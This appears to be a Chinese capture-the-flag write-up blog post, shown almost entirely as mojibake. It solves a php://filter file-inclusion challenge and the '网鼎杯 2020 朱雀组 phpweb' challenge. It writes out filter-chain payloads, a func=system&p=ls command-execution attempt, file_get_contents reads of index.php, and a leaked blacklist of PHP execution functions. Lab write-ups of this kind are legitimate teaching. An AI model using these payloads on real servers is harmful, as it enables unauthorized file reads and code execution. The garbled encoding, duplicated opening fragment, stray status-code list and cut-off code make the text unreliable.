å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag-phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag-phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™-ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag.phpæºç ï¼šå›æ˜¾äº†dont hackï¼ä¼°è®¡check.phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†convert.iconv.UTF-8*.UCS-4BE.resource=./check.phpè¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.phpè¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼šç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼šhttps://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼šæ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼šæ‹¿åˆ°flagï¼šæœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag.phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag.phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™:[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>è¿›å…¥ç¯å¢ƒï¼Œæœ´å®æ— åçš„ä¸€å°æ®µphpï¼Œç›´æ¥filterä¼ªåè®®è¯»flag.phpæºç ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" alt="image"><br>å›æ˜¾äº†dont hackï¼ä¼°è®¡check.phpèµ·ä½œç”¨ç„¶åè§¦å‘ä»€ä¹ˆå…³é”®è¯äº†ã€‚ã€‚è¿™æ—¶å€™æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ä¸€é“é¢˜ï¼šç”¨äº†<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>è¿™ç§ç±»å‹çš„è¿‡æ»¤å™¨ï¼Œé‚£å°±è¯•è¯•è¿™ä¸ªï¼š<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" alt="image"><br>è¿‡æ»¤å™¨å¯¹äº†ä½†æ˜¯ç”¨æ³•ä¸å¯¹ï¼Œé‚£å¯èƒ½æ˜¯input-encodingå’Œoutput-encodingä¸å¯¹ã€‚ã€‚éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾ã€‚ã€‚ä½†è¿™ç©æ„å¯ç”¨çš„ç¼–ç å®åœ¨å¤ªå¤šï¼š<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMOï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-DOCOMOï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-Bï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-KDDIï¼‰<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANKï¼ˆåˆ«åï¼šUTF-<span class="hljs-number">8</span>-SOFTBANKï¼‰<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDIï¼ˆåˆ«åï¼šISO-<span class="hljs-number">2022</span>-JP-KDDIï¼‰<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>ï¼ˆåˆ«åï¼šCP949ï¼‰<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>ï¼ˆåˆ«åï¼šCP1251ï¼‰<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>ï¼ˆåˆ«åï¼šCP1252ï¼‰<br>    <span class="hljs-attribute">CP866</span>ï¼ˆåˆ«åï¼šIBM866ï¼‰<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>ï¼ˆåˆ«åï¼šArmSCII8<br></code></pre></td></tr></table></figure><br>ç›´æ¥å»ç¿»äº†wpã€‚ã€‚æ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼š<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>æˆ‘æ˜¯æ‡’ç‹—å°±ä¸ä¸€ä¸ªä¸€ä¸ªåŠ äº†ã€‚ã€‚ä¹Ÿä¸çŸ¥é“æœ‰æ²¡æœ‰ç¼–ç çš„å­—å…¸ï¼Œèƒ½æ–¹ä¾¿ä¸å°‘ã€‚æˆ‘æ”¾äº†4ç§ç†Ÿæ‚‰ä¸‹æ­¥éª¤ï¼šburpsuiteçš„intruderæ¨¡å—çˆ†ä¸€ä¸‹ï¼Œé€‰æ‹©é›†æŸç‚¸å¼¹æ¨¡å¼ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" alt="image"><br>æ ¹æ®é•¿åº¦æ’åˆ—ä¸€ä¸‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" alt="image"><br>æ‹¿åˆ°flagï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" alt="image"><br>æœ€åè¯´ä¸‹ä¸ºä»€ä¹ˆè¦å»è¯»flag.phpè€Œä¸æ˜¯åˆ«çš„ï¼šä¸€æ˜¯å¾ˆå¤šflagéƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œï¼ŒäºŒæ˜¯ç›´æ¥è®¿é—®flag.phpæ—¶å®ƒå¹¶æ²¡ç»™æˆ‘ä»¬æŠ¥é”™:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xxï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²è¢«æ¥æ”¶ï¼Œç»§ç»­å¤„ç†ã€‚<br>   <span class="hljs-number"> 100 </span>Continueï¼šæœåŠ¡å™¨å·²æ¥æ”¶åˆ°è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼Œå®¢æˆ·ç«¯åº”ç»§ç»­å‘é€å‰©ä½™éƒ¨åˆ†ã€‚<br>   <span class="hljs-number"> 101 </span>Switching Protocolsï¼šæœåŠ¡å™¨å·²ç†è§£å¹¶æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå°†åˆ‡æ¢åˆ°æ–°çš„åè®®ã€‚<br><br>2xxï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚å·²æˆåŠŸè¢«æœåŠ¡å™¨æ¥æ”¶ã€ç†è§£å’Œå¤„ç†ã€‚<br>   <span class="hljs-number"> 200 </span>OKï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨è¿”å›è¯·æ±‚çš„å†…å®¹ã€‚<br>   <span class="hljs-number"> 201 </span>Createdï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨åˆ›å»ºäº†æ–°èµ„æºã€‚<br>   <span class="hljs-number"> 204 </span>No Contentï¼šè¯·æ±‚æˆåŠŸï¼ŒæœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚<br><br>3xxï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºéœ€è¦è¿›ä¸€æ­¥æ“ä½œä»¥å®Œæˆè¯·æ±‚ã€‚<br>   <span class="hljs-number"> 301 </span>Moved Permanentlyï¼šè¯·æ±‚çš„èµ„æºå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚<br>   <span class="hljs-number"> 302 </span>Foundï¼šè¯·æ±‚çš„èµ„æºä¸´æ—¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚<br>   <span class="hljs-number"> 304 </span>Not Modifiedï¼šèµ„æºæœªä¿®æ”¹ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ç¼“å­˜çš„ç‰ˆæœ¬ã€‚<br><br>4xxï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æœ‰é”™è¯¯ã€‚<br>   <span class="hljs-number"> 400 </span>Bad Requestï¼šè¯·æ±‚æ— æ•ˆï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£ã€‚<br>   <span class="hljs-number"> 401 </span>Unauthorizedï¼šè¯·æ±‚è¦æ±‚èº«ä»½éªŒè¯ã€‚<br>   <span class="hljs-number"> 404 </span>Not Foundï¼šè¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ã€‚<br><br>5xxï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚<br>   <span class="hljs-number"> 500 </span>Internal Server Errorï¼šæœåŠ¡å™¨é‡åˆ°äº†æ„å¤–é”™è¯¯ã€‚<br>   <span class="hljs-number"> 502 </span>Bad Gatewayï¼šæœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–ä»£ç†ï¼Œä»ä¸Šæ¸¸æœåŠ¡å™¨æ¥æ”¶åˆ°æ— æ•ˆå“åº”ã€‚<br>   <span class="hljs-number"> 503 </span>Service Unavailableï¼šæœåŠ¡å™¨å½“å‰æ— æ³•å¤„ç†è¯·æ±‚ï¼Œé€šå¸¸ç”±äºè¿‡è½½æˆ–ç»´æŠ¤ã€‚<br></code></pre></td></tr></table></figure><br><strong>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</strong></h2><p>è¿›å…¥ç¯å¢ƒï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" alt="image"><br>æ²¡å•¥ç‰¹åˆ«çš„ã€‚ã€‚ä¸è¿‡è¿™é¡µé¢æ²¡è¿‡å‡ ç§’å°±ä¼šåˆ·æ–°ä¸€ä¸‹ï¼Œå‡ºç°ä¸‹é¢è¿™ç§ä¸œè¥¿ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" alt="image"><br>ä»–è¯´æŸä¸ªå’Œdataæœ‰å…³çš„å‡½æ•°è®¾ç½®æœ‰é—®é¢˜?å³é”®çœ‹ä¸‹æºç æœ‰å•¥ä¸œè¥¿ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" alt="image"><br>burpsuiteæŠ“ä¸‹åŒ…çœ‹çœ‹ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" alt="image"><br>ä¸‹é¢æœ‰ä¸ªè¿™ä¸ªä¸œè¥¿ï¼š<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>å‰é¢æ˜¯ä¸ªå‡½æ•°ï¼Ÿåé¢æ˜¯ä»–çš„å‚æ•°ï¼Ÿçœ‹ç€åƒå‘½ä»¤æ‰§è¡Œï¼Œæ”¹æˆsystem(â€˜lsâ€™)çœ‹çœ‹æ•ˆæœï¼š<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" alt="image"><br>å›æ˜¾äº†hackerã€‚ã€‚ä¼°è®¡æ˜¯å¤ªç›´ç™½äº†ï¼Œsystem&#x2F;evaléƒ½ä¼šå›æ˜¾Hackerã€‚include&#x2F;requireå‡½æ•°è¯»ä¸‹index.phpçš„æºç ï¼Ÿ<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" alt="image"><br>æç¤ºcall_user_func()å‡½æ•°æ‰¾ä¸åˆ°ç¬¬ä¸€ä¸ªå‚æ•°include&#x2F;requireæˆ–è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„å‡½æ•°åï¼Ÿæ€ä¹ˆä¼šæ‰¾ä¸åˆ°include()å‡½æ•°å‘¢ï¼Ÿé—®äº†ä¸‹GPTå‘ç°call_back_funcä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½èƒ½æ‰§è¡Œï¼Œå®ƒæ˜¯<strong>è°ƒç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°æˆ–æ–¹æ³•</strong>ã€‚è€Œä¸”å¹¶ä¸æ˜¯æ‰€æœ‰å‡½æ•°éƒ½æ˜¯å›è°ƒå‡½æ•°ï¼Œåˆ¤æ–­ä¸€ä¸ªå‡½æ•°èƒ½å¦å›è°ƒå¯ä»¥ç”¨<code>is_callable</code>å‡½æ•°ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¯ä»¥å›è°ƒ&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ä¸å¯å›è°ƒ&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼šä¸å¯å›è°ƒ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸å¾—ä¸è¯´CHATGPTè¿™ä¸œè¥¿ç¡®å®å¥½ç”¨ï¼Œæˆ‘é—®ä»–call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)ä¸ºä»€ä¹ˆä¸è¡Œæ—¶ä»–ä¸å…‰ç»™äº†ä¸å¯ç”¨çš„ç†ç”±ï¼Œè¿˜å»ºè®®æˆ‘ç”¨file_get_contents()å‡½æ•°å»è¯»æ–‡ä»¶ï¼š<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" alt="image"><br>å·®ç‚¹æŠŠè¿™ä¸œè¥¿å¿˜äº†ï¼Œæ—¢ç„¶å®ƒå¯ä»¥å›è°ƒå°±file_get_contents(index.php)è¯»ä¸‹Index.phpï¼š<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//é»‘åå•ï¼Œç¦ç”¨äº†å¾ˆå¤šå‡½æ•°</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span 